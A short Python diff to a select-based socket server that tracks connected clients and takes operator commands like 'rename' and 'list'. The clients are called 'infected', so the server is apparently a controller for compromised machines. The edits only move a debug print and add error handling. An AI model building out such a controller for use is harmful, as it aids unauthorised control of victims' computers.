@@ -12,8 +12,8 @@ def server():
     print("waiting for connection")
     while True:
         r_sock, w_sock, x_sock = select.select(server_list, [], [])
+        print(r_sock)
         for elem in r_sock:
-            print(r_sock)
             if elem == soc:
                 (clientsocket, addressguest) = soc.accept()
                 print(f"Connection from {addressguest}")
@@ -38,8 +38,11 @@ def server():
                         case "rename":
                             old_name = order.strip().split(" ")[1]
                             new_name = order.strip().split(" ")[2]
-                            dict_ip[new_name] = dict_ip[old_name]
-                            del dict_ip[old_name]
+                            try:
+                                
+                                dict_ip[new_name] = dict_ip[old_name]
+                                del dict_ip[old_name]
+                            except : print("error in your command")
                             
                         case "list":
                             for infected in dict_ip:
